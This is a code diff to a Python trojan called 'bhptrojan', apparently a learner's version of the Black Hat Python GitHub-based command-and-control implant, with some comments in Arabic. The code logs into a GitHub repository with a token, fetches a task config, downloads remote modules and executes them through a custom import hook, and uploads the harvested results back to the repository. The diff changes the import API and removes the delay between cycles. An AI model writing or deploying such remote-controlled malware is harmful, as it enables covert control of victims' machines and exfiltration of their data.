@@ -1,8 +1,6 @@
 import base64
 import github3
 import importlib
-import importlib.abc
-import importlib.util
 import json
 import random
 import sys
@@ -10,11 +8,11 @@ import threading
 import time
 from datetime import datetime
 
+# استبدل هذا بمحتوى ملف الرمز الخاص بك أو تأكد من وجود ملف mytoken.txt
 def github_connect():
-    # قراءة التوكن من الملف المحلي
     with open('mytoken.txt') as f:
-        token = f.read().strip()
-    user = 'alakhas997-droid'
+        token = f.read()
+    user = 'alakhas997-droid'  # تأكد من أن اسم المستخدم صحيح
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
 
@@ -31,52 +29,63 @@ class Trojan:
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
+        
         for task in config:
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
         return config
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        try:
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+        except Exception as e:
+            print(f"[-] Error running module {module}: {e}")
 
     def store_module_result(self, data):
-        # تعديل صيغة الوقت لتكون مقبولة في أسماء ملفات ويندوز (بدون نقطتين راسيتين)
-        message = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
-        bindata = bytes('%r' % data, 'utf-8')
+        
+        # تحويل البيانات إلى نص مشفر إذا لم تكن كذلك
+        if isinstance(data, bytes):
+            bindata = data
+        else:
+            bindata = bytes('%r' % data, 'utf-8')
+            
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
     def run(self):
         while True:
             config = self.get_config()
             for task in config:
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
+                thread = threading.Thread(
+                    target=self.module_runner,
+                    args=(task['module'],)
+                )
                 thread.start()
-                time.sleep(random.randint(1, 10))
-            # فترة الانتظار بين كل دورة
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(1, 10))
 
-class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
+class GitImporter:
     def __init__(self):
         self.current_module_code = ""
 
-    def find_spec(self, fullname, path, target=None):
-        print(f"[*] Attempting to retrieve {fullname}")
+    def find_module(self, name, path=None):
+        print("[*] Attempting to retrieve %s" % name)
         self.repo = github_connect()
         try:
-            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
+            new_library = get_file_contents('modules', f'{name}.py', self.repo)
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library)
-                return importlib.util.spec_from_loader(fullname, loader=self)
-        except Exception as e:
+                return self
+        except:
             return None
 
-    def create_module(self, spec):
-        return None
-
-    def exec_module(self, module):
-        exec(self.current_module_code, module.__dict__)
+    def load_module(self, name):
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        return new_module
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
